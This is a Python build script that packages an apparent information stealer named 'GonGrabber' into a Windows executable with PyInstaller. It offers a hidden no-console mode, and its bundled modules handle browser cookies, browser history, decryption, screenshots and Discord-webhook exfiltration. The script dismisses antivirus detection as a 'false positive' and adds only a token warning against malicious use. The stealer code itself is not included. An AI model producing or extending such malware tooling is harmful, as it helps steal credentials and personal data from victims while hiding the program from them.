import os
import subprocess
import sys

def create_executable():
    print("🏗️ EXECUTABLE BUILDER")
    print("=" * 40)
    
    name = input("Executable name (without .exe): ").strip()
    if not name:
        name = "GonGrabber"
    
    print("\nExecution mode:")
    print("1 - Hidden Mode (no console)")
    print("2 - Console Mode (for debug)")
    
    mode = input("Choose mode [1/2]: ").strip()
    if mode == "1":
        mode_param = "--windowed"
        mode_text = "Hidden"
    else:
        mode_param = "--console" 
        mode_text = "With Console"
    
    print(f"\nConfiguration:")
    print(f"   Name: {name}.exe")
    print(f"   Mode: {mode_text}")
    
    confirm = input("\nConfirm build? [y/N]: ").lower()
    if confirm != 'y':
        print("Build cancelled!")
        return
    
    print("\n🏗️ Starting build...")
    
    command = [
        'pyinstaller',
        '--onefile',
        mode_param,
        '--clean',
        '--hidden-import=win32timezone',
        '--hidden-import=browser_cookie3', 
        '--hidden-import=Crypto.Cipher',
        '--hidden-import=Crypto.Protocol',
        '--hidden-import=Crypto.Util',
        '--hidden-import=discord_webhook',
        '--hidden-import=browser_history',
        '--hidden-import=prettytable',
        '--hidden-import=psutil',
        '--hidden-import=cpuinfo',
        '--hidden-import=pyautogui',
        '--hidden-import=lz4',
        '--hidden-import=lz4.block',
        '--hidden-import=lz4.frame',
        f'--name={name}',
        'main.py'
    ]
    
    try:
        result = subprocess.run(command, capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"\nBUILD COMPLETED SUCCESSFULLY!")
            print(f"File: dist\\{name}.exe")
            
            exe_path = f"dist\\{name}.exe"
            if os.path.exists(exe_path):
                size = os.path.getsize(exe_path) / (1024 * 1024)
                print(f"📏 Size: {size:.1f} MB")
            
            print("\nIMPORTANT:")
            print("   - Test in VM first")
            print("   - Antivirus may detect as false positive")
            print("   - Do not distribute for malicious purposes")
        else:
            print(f"\nBUILD ERROR!")
            print("Error output:")
            print(result.stderr)
            
    except Exception as e:
        print(f"\nERROR: {e}")
        print("Check if PyInstaller is installed: pip install pyinstaller")

if __name__ == "__main__":
    create_executable()
    input("\nPress Enter to exit...")